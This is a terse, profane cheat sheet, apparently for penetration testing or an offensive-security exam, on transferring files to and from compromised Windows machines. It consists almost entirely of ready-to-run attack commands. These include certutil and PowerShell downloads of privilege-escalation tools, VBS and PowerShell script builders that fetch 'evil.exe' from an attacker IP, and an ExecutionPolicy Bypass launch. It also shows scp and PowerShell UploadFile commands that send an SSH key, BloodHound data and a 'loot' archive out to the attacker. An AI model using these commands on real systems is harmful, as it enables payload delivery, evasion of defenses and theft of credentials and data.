
```

Delete yo shit when you done.

certutil.exe -urlcache -split -f [http://7-zip.org/a/7z1604-x64.exe](http://7-zip.org/a/7z1604-x64.exe) 7zip.exe

iwr [http://IP/PowerUp.ps1](http://IP/PowerUp.ps1) -Outfile PowerUp.ps1

You can host an FTP server if you really want to...

pure-ftpd

OR SMB

impacket-smbserver SMB . -comment share -ts -debug -smb2support -username user -password 'pass'

I like hosting a web server personally though.

python -m http.server 80

scp Relia_20240414043344_BloodHound.zip -i id_rsa kali@IP:/home/kali/Desktop/

scp .\Thunderbird.lnk kali@IP:/home/kali/Desktop/

iwr [http://IP:8080/id_rsa](http://IP:8080/id_rsa) -Outfile id_rsa

Here's a fun little ditty to create a .vbs file to download a file from a self hosted web server if no other options exist:

echo strUrl = WScript.Arguments.Item(0) > wget.vbs

echo StrFile = WScript.Arguments.Item(1) >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs

echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs

echo Err.Clear >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs

echo http.Open "GET", strURL, False >> wget.vbs

echo http.Send >> wget.vbs

echo varByteArray = http.ResponseBody >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs

echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs

echo strData = "" >> wget.vbs

echo strBuffer = "" >> wget.vbs

echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs

echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs

echo Next >> wget.vbs

echo ts.Close >> wget.vbs

SAMPLE USAGE:

cscript wget.vbs [http://[IP]/evil.exe](http://[IP]/evil.exe) evil.exe

Here is a similar script builder for powershell:

echo $webclient = New-Object System.Net.WebClient >>wget.ps1

echo $url = "[http://[IP]/evil.exe](http://[IP]/evil.exe)" >>wget.ps1

echo $file = "new-exploit.exe" >>wget.ps1

echo $webclient.DownloadFile($url,$file) >>wget.ps1

YOU MUST RUN THE SCRIPT LIKE SO:

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

You can also run the powershell command above as a one-liner:

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://[IP]/winPEAS.bat, 'winpeas.bat')

If you wanna be wild, you can use exe2hex to convert to a script that recreates the file from hex string via non-interactive methods. A bit over the top, but probably helps bypass some bullshit.

powershell.exe (New-Object System.Net.WebClient).UploadFile('C:\Users\Administrator\20220204195540_loot.zip', '[http://10.6.64.57/20220204195540_loot.zip](http://10.6.64.57/20220204195540_loot.zip)')

```